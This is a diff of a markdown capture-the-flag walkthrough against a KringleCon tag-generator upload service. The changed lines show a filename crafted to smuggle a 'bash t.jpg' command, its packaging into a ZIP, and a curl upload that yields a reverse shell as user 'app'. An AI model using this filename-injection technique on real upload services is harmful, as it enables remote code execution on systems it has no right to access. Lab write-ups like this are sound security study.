@@ -54,9 +54,9 @@ Create an executor file:
 ```
 touch \'\`bash\ t.jpg\`\;\'.jpg
 ```
-Create the ZIP file for upload:
+Create the ZIP file including these two file for upload:
 ```
-zip joergen.zip \'\`bash\ t.jpg\`\;\'.jpg
+zip joergen.zip t.jpg \'\`bash\ t.jpg\`\;\'.jpg
 ```
 Start the reverse shell listener on your local device:
 ```
@@ -68,9 +68,9 @@ curl https://tag-generator.kringlecastle.com/upload -F'my_file[]=@joergen.zip'
 ```
 Now you have in the reverse shell listener an interactive shell as user `app`.
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTE1OTkyNTQ0MTUsLTYxOTI5NzQxMSwtNT
-c2NjEwMDc1LDIxMDc1Mjk4NDYsOTIyMTQ0MzUsLTM5ODQ5MTQ2
-MSwxMTUxNTU2ODk2LDIzODQ2MDI3MiwxOTMzMzYxNzg3LC0xND
-Y3NjE1MjYyLC0yNDM5NDI4NjYsMTMxMjA1NjQ1Myw5MjA0NTU4
-NjUsLTE2MDYwNzgwNDBdfQ==
+eyJoaXN0b3J5IjpbMTM5NTc5NDgyNCwtMTU5OTI1NDQxNSwtNj
+E5Mjk3NDExLC01NzY2MTAwNzUsMjEwNzUyOTg0Niw5MjIxNDQz
+NSwtMzk4NDkxNDYxLDExNTE1NTY4OTYsMjM4NDYwMjcyLDE5Mz
+MzNjE3ODcsLTE0Njc2MTUyNjIsLTI0Mzk0Mjg2NiwxMzEyMDU2
+NDUzLDkyMDQ1NTg2NSwtMTYwNjA3ODA0MF19
 -->
